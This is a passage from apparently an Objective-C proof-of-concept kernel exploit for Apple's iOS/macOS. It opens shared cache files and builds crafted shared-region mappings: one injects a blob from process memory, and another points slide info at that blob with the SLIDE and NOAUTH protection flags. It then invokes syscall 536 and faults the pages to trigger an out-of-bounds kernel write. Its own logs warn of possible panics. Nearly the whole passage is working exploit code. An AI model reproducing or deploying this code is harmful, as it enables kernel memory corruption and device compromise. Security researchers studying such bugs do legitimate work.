            size_t mainReadSz = 0x50000;
            uint8_t *mainBuf = (uint8_t *)malloc(mainReadSz);
            if (mainBuf) {
                memset(mainBuf, 0, mainReadSz);
                rie_mach_vm_size_t got = 0;
                if (vmr(mach_task_self(), mainHdrAddr, mainReadSz,
                    (rie_mach_vm_address_t)(uintptr_t)mainBuf, &got) == KERN_SUCCESS) {
                    uint32_t sub_off = *(uint32_t*)(mainBuf + 0x188);
                    uint32_t sub_cnt = *(uint32_t*)(mainBuf + 0x18c);
                    [self log:[NSString stringWithFormat:@"subCacheArray: off=0x%x cnt=%u looking for #%d",
                        sub_off, sub_cnt, subIdx]];
                    if ((uint32_t)subIdx < sub_cnt) {
                        size_t eo = (size_t)sub_off + (size_t)subIdx * 56;
                        if (eo + 56 <= got) {
                            char suffix[33] = {0};
                            memcpy(suffix, mainBuf + eo + 24, 32);
                            for (int ti = 31; ti >= 0; ti--) {
                                if (suffix[ti] == ' ' || suffix[ti] == 0) suffix[ti] = 0; else break;
                            }
                            [self log:[NSString stringWithFormat:@"sub-cache suffix: \"%s\"", suffix]];
                            if (suffix[0]) {
                                for (int ci = 0; ci < nDirs && fd_sub == fd_main; ci++) {
                                    char sp[1024];
                                    snprintf(sp, sizeof(sp), "%s%s%s", cacheDirs[ci], cacheName, suffix);
                                    int sfd = open(sp, O_RDONLY);
                                    if (sfd >= 0) {
                                        fd_sub = sfd;
                                        [self log:[NSString stringWithFormat:@"sub-cache OPEN: %s fd=%d", sp, fd_sub]];
                                        uint8_t sh[0x40]; pread(sfd, sh, 0x40, 0);
                                        uint64_t sco = *(uint64_t*)(sh+0x28), scsz = *(uint64_t*)(sh+0x30);
                                        rie_fsignatures_t fs2; memset(&fs2, 0, sizeof(fs2));
                                        fs2.fs_file_start = (off_t)sco;
                                        fs2.fs_blob_start = NULL;
                                        fs2.fs_blob_size  = (size_t)scsz;
                                        int rc2 = fcntl(sfd, F_ADDFILESIGS_RETURN, &fs2);
                                        [self log:[NSString stringWithFormat:@"F_ADDFILESIGS(sub) rc=%d cs=0x%llx+0x%llx", rc2, sco, scsz]];
                                    }
                                }
                            }
                        }
                    }
                }
                free(mainBuf);
            }
            if (fd_sub == fd_main) {
                [self log:@"!! Could not open sub-cache file — using main fd (will fail)"];
            }
        }

        // ── Build 3-file, 3-mapping structure (reference pattern) ──
        // files[0] = main cache → mappings[0] = header (no slide)
        // files[1] = fd=-1 → mappings[1] = blob inject (copies blob into shared region)
        // files[2] = slide cache → mappings[2] = slide carrier (slide info → injected blob)

        c->files[0].sf_fd = fd_main;
        c->files[0].sf_mappings_count = 1;
        c->files[0].sf_slide = 0;

        c->files[1].sf_fd = -1;
        c->files[1].sf_mappings_count = 1;
        c->files[1].sf_slide = 0;

        c->files[2].sf_fd = fd_sub;
        c->files[2].sf_mappings_count = 1;
        c->files[2].sf_slide = 0;

        // mappings[0]: header from main cache (no slide info)
        c->mappings[0].sms_address     = hdrAddr;
        c->mappings[0].sms_size         = hdrSize;
        c->mappings[0].sms_file_offset  = hdrFoff;
        c->mappings[0].sms_slide_size   = 0;
        c->mappings[0].sms_slide_start  = 0;
        c->mappings[0].sms_max_prot     = hdrMax;
        c->mappings[0].sms_init_prot    = hdrInit;

        // mappings[1]: fd=-1 blob inject (copies from process memory into shared region)
        c->mappings[1].sms_address     = blob_sr;
        c->mappings[1].sms_size         = 0x4000;
        c->mappings[1].sms_file_offset  = (uint64_t)(uintptr_t)((uint8_t*)cfg + 0x4000); // blob page VA
        c->mappings[1].sms_slide_size   = 0;
        c->mappings[1].sms_slide_start  = 0;
        c->mappings[1].sms_max_prot     = 1;  // VM_PROT_READ
        c->mappings[1].sms_init_prot    = 1;

        // mappings[2]: slide carrier, slide-info references injected blob in shared region
        c->mappings[2].sms_address     = naAddr;
        c->mappings[2].sms_size         = naSize;
        c->mappings[2].sms_file_offset  = naFoff;
        c->mappings[2].sms_slide_size   = blobSz;
        c->mappings[2].sms_slide_start  = blob_sr; // injected blob in shared region
        c->mappings[2].sms_max_prot     = naMax | 0x20 | 0x40; // VM_PROT_SLIDE | VM_PROT_NOAUTH
        c->mappings[2].sms_init_prot    = naInit;

        [self log:[NSString stringWithFormat:@"\n3-file/3-mapping setup:"]];
        [self log:[NSString stringWithFormat:@"  [0] hdr:  a=0x%llx sz=0x%llx foff=0x%llx fd=%d",
            hdrAddr, hdrSize, hdrFoff, fd_main]];
        [self log:[NSString stringWithFormat:@"  [1] blob: a=0x%llx sz=0x4000 src=%p fd=-1",
            blob_sr, (uint8_t*)cfg + 0x4000]];
        [self log:[NSString stringWithFormat:@"  [2] slid: a=0x%llx sz=0x%llx foff=0x%llx slidestart=0x%llx mp=0x%x fd=%d",
            naAddr, naSize, naFoff, blob_sr, c->mappings[2].sms_max_prot, fd_sub]];
        [self log:[NSString stringWithFormat:@"  fault_addr=0x%llx blobSz=%zu", naAddr, blobSz]];

        // ── Call syscall 536 ──
        errno = 0;
        long r536 = sc(536, 3, c->files, 3, c->mappings);
        int savedErrno = errno;
        [self log:[NSString stringWithFormat:@"\nsyscall(536): ret=%ld errno=%d", r536, savedErrno]];

        if (r536 == 0) {
            [self log:@"*** FIRST-MAPPER SUCCESS! syscall 536 returned 0! ***"];

            // check_np to nest the region submap
            uint64_t scratch = 0;
            long rCheck = sc(294, &scratch);
            [self log:[NSString stringWithFormat:@"check_np after 536: ret=%ld addr=0x%llx", rCheck, scratch]];

            // Sweep-fault carrier pages to trigger OOB via page_starts[2]=0xFFFE
            [self log:@"Sweep-faulting carrier pages..."];
            Rie_VMReadOverwriteFn vmr2 = (Rie_VMReadOverwriteFn)dlsym(RTLD_DEFAULT, "mach_vm_read_overwrite");
            if (vmr2) {
                uint64_t nFaulted = 0;
                for (uint64_t off = 0; off < naSize && off < 512 * 0x4000; off += 0x4000) {
                    rie_mach_vm_size_t got = 0;
                    uint8_t byte;
                    kern_return_t fkr = vmr2(mach_task_self(), naAddr + off, 1,
                        (rie_mach_vm_address_t)(uintptr_t)&byte, &got);
                    if (fkr == KERN_SUCCESS) nFaulted++;
                }
                [self log:[NSString stringWithFormat:@"Faulted %llu pages — if system didn't panic, OOB may have landed safely", nFaulted]];
            }
        } else {
            if (savedErrno == 22) {
                [self log:@"EINVAL(22): likely not first-mapper (region already populated by dyld)"];
            } else if (savedErrno == 4) {
                [self log:@"EINTR(4): bad fd, prot mismatch, or mapping count mismatch"];
            } else if (savedErrno == 2) {
                [self log:@"ENOENT(2): shared region not found"];
            } else if (savedErrno == 12) {
                [self log:@"ENOMEM(12): region bound but empty (viable first-mapper — should not fail)"];
            }
        }

        free(blob);
        munmap(cfg, cfgSz);
    });
}

@end
